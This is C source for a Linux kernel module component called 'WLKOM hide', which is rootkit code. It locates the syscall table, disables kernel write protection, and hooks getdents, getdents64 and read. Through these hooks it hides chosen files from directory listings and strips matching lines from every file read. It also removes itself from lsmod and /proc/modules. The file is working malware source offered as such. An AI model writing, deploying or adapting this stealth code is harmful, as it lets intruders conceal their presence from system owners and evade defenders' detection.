#include "hide.h"

#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
#    define KPROBE_LOOKUP 1
#    include <linux/kprobes.h>
static struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
#endif

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

static unsigned long *syscall_table = NULL;

static long (*orig_getdents64)(unsigned int fd,
                               struct linux_dirent64 __user *dirent,
                               unsigned int count) = NULL;

static long (*orig_getdents)(unsigned int fd,
                             struct linux_dirent __user *dirent,
                             unsigned int count) = NULL;

static long (*orig_read)(unsigned int fd, char __user *buf,
                         size_t count) = NULL;

struct hidden_file
{
    char             name[256];
    struct list_head list;
};

struct hidden_line
{
    char             filename[256];
    char             pattern[256];
    struct list_head list;
};

static LIST_HEAD(hidden_files);
static LIST_HEAD(hidden_lines);

/* ── write-protect helpers ── */

/**
 * @brief Disables CR0 write-protection to allow syscall table modification.
 */
static void disable_write_protect(void)
{
    unsigned long cr0 = read_cr0();

    write_cr0(cr0 & ~0x00010000UL);
}

/**
 * @brief Re-enables CR0 write-protection after syscall table modification.
 */
static void enable_write_protect(void)
{
    unsigned long cr0 = read_cr0();

    write_cr0(cr0 | 0x00010000UL);
}

/* ── dirent filtering ── */

/**
 * @brief Removes hidden file entries from a getdents64 kernel buffer in-place.
 * @param buf  Kernel copy of the dirent64 buffer.
 * @param ret  Original buffer size in bytes.
 * @return New buffer size after removals.
 */
static long filter_dirent64(char *buf, long ret)
{
    struct hidden_file    *hf;
    struct linux_dirent64 *d;
    long                   new_ret = ret;
    int                    bpos    = 0;

    while (bpos < ret)
    {
        d = (struct linux_dirent64 *)(buf + bpos);
        list_for_each_entry(hf, &hidden_files, list)
        {
            if (strcmp(d->d_name, hf->name) == 0)
            {
                memmove(buf + bpos, buf + bpos + d->d_reclen,
                        ret - bpos - d->d_reclen);
                new_ret -= d->d_reclen;
                ret     -= d->d_reclen;
                goto next64;
            }
        }
        bpos += d->d_reclen;
    next64:;
    }
    return new_ret;
}

/**
 * @brief Removes hidden file entries from a getdents (32-bit) kernel buffer.
 * @param buf  Kernel copy of the dirent buffer.
 * @param ret  Original buffer size in bytes.
 * @return New buffer size after removals.
 */
static long filter_dirent(char *buf, long ret)
{
    struct hidden_file  *hf;
    struct linux_dirent *d;
    long                 new_ret = ret;
    int                  bpos    = 0;

    while (bpos < ret)
    {
        d = (struct linux_dirent *)(buf + bpos);
        list_for_each_entry(hf, &hidden_files, list)
        {
            if (strcmp(d->d_name, hf->name) == 0)
            {
                memmove(buf + bpos, buf + bpos + d->d_reclen,
                        ret - bpos - d->d_reclen);
                new_ret -= d->d_reclen;
                ret     -= d->d_reclen;
                goto next;
            }
        }
        bpos += d->d_reclen;
    next:;
    }
    return new_ret;
}

/* ── hooked syscalls ── */

/**
 * @brief Hooked getdents64: filters hidden files from directory listings.
 * @param fd      File descriptor of the directory.
 * @param dirent  Userspace dirent64 buffer.
 * @param count   Buffer size.
 * @return Number of bytes in the filtered buffer, or original ret on error.
 */
static long hooked_getdents64(unsigned int fd,
                              struct linux_dirent64 __user *dirent,
                              unsigned int count)
{
    long  ret = orig_getdents64(fd, dirent, count);
    char *buf;
    long  new_ret;

    if (ret <= 0)
        return ret;
    buf = kmalloc(ret, GFP_KERNEL);
    if (!buf)
        return ret;
    if (copy_from_user(buf, dirent, ret))
    {
        kfree(buf);
        return ret;
    }
    new_ret = filter_dirent64(buf, ret);
    if (copy_to_user(dirent, buf, new_ret))
        pr_warn("WLKOM: copy_to_user failed\n");
    kfree(buf);
    return new_ret;
}

/**
 * @brief Hooked getdents (32-bit compat): filters hidden files.
 * @param fd      File descriptor of the directory.
 * @param dirent  Userspace dirent buffer.
 * @param count   Buffer size.
 * @return Number of bytes in the filtered buffer, or original ret on error.
 */
static long hooked_getdents(unsigned int fd,
                            struct linux_dirent __user *dirent,
                            unsigned int count)
{
    long  ret = orig_getdents(fd, dirent, count);
    char *buf;
    long  new_ret;

    if (ret <= 0)
        return ret;
    buf = kmalloc(ret, GFP_KERNEL);
    if (!buf)
        return ret;
    if (copy_from_user(buf, dirent, ret))
    {
        kfree(buf);
        return ret;
    }
    new_ret = filter_dirent(buf, ret);
    if (copy_to_user(dirent, buf, new_ret))
        pr_warn("WLKOM: copy_to_user failed\n");
    kfree(buf);
    return new_ret;
}

/* ── line filtering ── */

/**
 * @brief Removes lines matching any hidden_line pattern from a kernel buffer.
 * @param kbuf  Kernel buffer containing file content (null-terminated).
 * @param size  Current content size.
 * @return New content size after line removals.
 */
static long filter_lines(char *kbuf, long size)
{
    struct hidden_line *hl;
    char               *pos;
    char               *line_start;
    char               *line_end;
    long                new_size = size;
    int                 line_len;

    list_for_each_entry(hl, &hidden_lines, list)
    {
        pos = kbuf;
        while ((pos = strstr(pos, hl->pattern)) != NULL)
        {
            line_start = pos;
            while (line_start > kbuf && *(line_start - 1) != '\n')
                line_start--;
            line_end = strchr(pos, '\n');
            line_end = line_end ? line_end + 1 : kbuf + new_size;
            line_len = line_end - line_start;
            memmove(line_start, line_end, new_size - (line_end - kbuf));
            new_size      -= line_len;
            kbuf[new_size] = '\0';
        }
    }
    return new_size;
}

/**
 * @brief Hooked read: strips lines containing hidden patterns before returning.
 * @param fd     File descriptor.
 * @param buf    Userspace destination buffer.
 * @param count  Read size.
 * @return Filtered byte count, or original ret on error.
 */
static long hooked_read(unsigned int fd, char __user *buf, size_t count)
{
    long  ret = orig_read(fd, buf, count);
    char *kbuf;
    long  new_ret;

    if (ret <= 0)
        return ret;
    kbuf = kmalloc(ret + 1, GFP_KERNEL);
    if (!kbuf)
        return ret;
    if (copy_from_user(kbuf, buf, ret))
    {
        kfree(kbuf);
        return ret;
    }
    kbuf[ret] = '\0';
    new_ret   = filter_lines(kbuf, ret);
    if (copy_to_user(buf, kbuf, new_ret))
        pr_warn("WLKOM: copy_to_user failed\n");
    kfree(kbuf);
    return new_ret;
}

/* ── public API ── */

/**
 * @brief Removes the module from lsmod and /proc/modules.
 */
void hide_module(void)
{
    list_del_init(&THIS_MODULE->list);
#if LINUX_VERSION_CODE < KERNEL_VERSION(6, 4, 0)
    kobject_del(&THIS_MODULE->mkobj.kobj);
#endif
}

/**
 * @brief Adds a filename to the hidden files list (hidden from ls/readdir).
 * @param name  Filename to hide (basename only, not a full path).
 */
void hide_file(const char *name)
{
    struct hidden_file *hf = kmalloc(sizeof(*hf), GFP_KERNEL);

    if (!hf)
        return;
    strncpy(hf->name, name, sizeof(hf->name) - 1);
    hf->name[sizeof(hf->name) - 1] = '\0';
    list_add(&hf->list, &hidden_files);
}

/**
 * @brief Removes a filename from the hidden files list.
 * @param name  Filename to unhide.
 */
void unhide_file(const char *name)
{
    struct hidden_file *hf;
    struct hidden_file *tmp;

    list_for_each_entry_safe(hf, tmp, &hidden_files, list)
    {
        if (strcmp(hf->name, name) == 0)
        {
            list_del(&hf->list);
            kfree(hf);
        }
    }
}

/**
 * @brief Registers a pattern to hide from reads of a specific file.
 * @param filename  Absolute path of the file to filter.
 * @param pattern   Substring: any line containing it will be stripped.
 */
void hide_line(const char *filename, const char *pattern)
{
    struct hidden_line *hl = kmalloc(sizeof(*hl), GFP_KERNEL);

    if (!hl)
        return;
    strncpy(hl->filename, filename, sizeof(hl->filename) - 1);
    hl->filename[sizeof(hl->filename) - 1] = '\0';
    strncpy(hl->pattern, pattern, sizeof(hl->pattern) - 1);
    hl->pattern[sizeof(hl->pattern) - 1] = '\0';
    list_add(&hl->list, &hidden_lines);
}

/**
 * @brief Removes a (filename, pattern) entry from the hidden lines list.
 * @param filename  File path previously registered.
 * @param pattern   Pattern previously registered.
 */
void unhide_line(const char *filename, const char *pattern)
{
    struct hidden_line *hl;
    struct hidden_line *tmp;

    list_for_each_entry_safe(hl, tmp, &hidden_lines, list)
    {
        if (strcmp(hl->filename, filename) == 0
            && strcmp(hl->pattern, pattern) == 0)
        {
            list_del(&hl->list);
            kfree(hl);
        }
    }
}

/* ── init / exit ── */

/**
 * @brief Resolves kallsyms_lookup_name and uses it to find sys_call_table.
 *        On kernel >= 5.7 kallsyms_lookup_name is no longer exported,
 *        so we use a kprobe to locate it at runtime.
 * @return Pointer to sys_call_table, or NULL on failure.
 */
static unsigned long *find_syscall_table(void)
{
    kallsyms_lookup_name_t fn;

#ifdef KPROBE_LOOKUP
    register_kprobe(&kp);
    fn = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);
#else
    fn = kallsyms_lookup_name;
#endif
    if (!fn)
        return NULL;
    return (unsigned long *)fn("sys_call_table");
}

/**
 * @brief Frees all entries in hidden_files and hidden_lines lists.
 */
static void free_lists(void)
{
    struct hidden_file *hf;
    struct hidden_file *hf_tmp;
    struct hidden_line *hl;
    struct hidden_line *hl_tmp;

    list_for_each_entry_safe(hf, hf_tmp, &hidden_files, list)
    {
        list_del(&hf->list);
        kfree(hf);
    }
    list_for_each_entry_safe(hl, hl_tmp, &hidden_lines, list)
    {
        list_del(&hl->list);
        kfree(hl);
    }
}

/**
 * @brief Hooks getdents64, getdents and read syscalls.
 * @return 0 on success, -1 if sys_call_table cannot be found.
 */
int hide_init(void)
{
    pr_info("WLKOM hide: initializing...\n");
    syscall_table = find_syscall_table();
    if (!syscall_table)
    {
        pr_err("WLKOM hide: syscall_table not found\n");
        return -1;
    }
    pr_info("WLKOM hide: syscall_table at %px\n", syscall_table);
    orig_getdents64 = (typeof(orig_getdents64))syscall_table[__NR_getdents64];
    orig_getdents   = (typeof(orig_getdents))syscall_table[__NR_getdents];
    orig_read       = (typeof(orig_read))syscall_table[__NR_read];
    disable_write_protect();
    syscall_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    syscall_table[__NR_getdents]   = (unsigned long)hooked_getdents;
    syscall_table[__NR_read]       = (unsigned long)hooked_read;
    enable_write_protect();
    pr_info("WLKOM hide: syscalls hooked\n");
    return 0;
}

/**
 * @brief Restores original syscalls and frees all hidden entries.
 */
void hide_exit(void)
{
    if (!syscall_table)
        return;
    disable_write_protect();
    syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    syscall_table[__NR_getdents]   = (unsigned long)orig_getdents;
    syscall_table[__NR_read]       = (unsigned long)orig_read;
    enable_write_protect();
    free_lists();
    pr_info("WLKOM hide: exited\n");
}
